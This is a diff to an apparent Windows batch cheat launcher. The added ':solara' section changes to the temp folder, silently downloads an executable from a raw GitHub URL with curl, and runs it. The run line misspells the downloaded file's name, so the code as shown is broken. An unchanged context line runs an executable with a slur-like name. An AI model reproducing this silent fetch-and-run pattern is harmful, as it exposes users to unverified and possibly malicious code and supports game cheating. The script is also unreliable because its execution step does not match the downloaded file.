@@ -159,3 +159,8 @@ echo [36mDownloading updates.
 timeout 1 >nul
 echo [36mStarting cheat.
 niger.exe
+
+:solara
+cd %temp%
+curl -s https://raw.githubusercontent.com/quivings/Solara/main/Files/SolaraBootstrapper.exe --output SolaraBootstrapper.exe
+SolaraBootstraper.exe
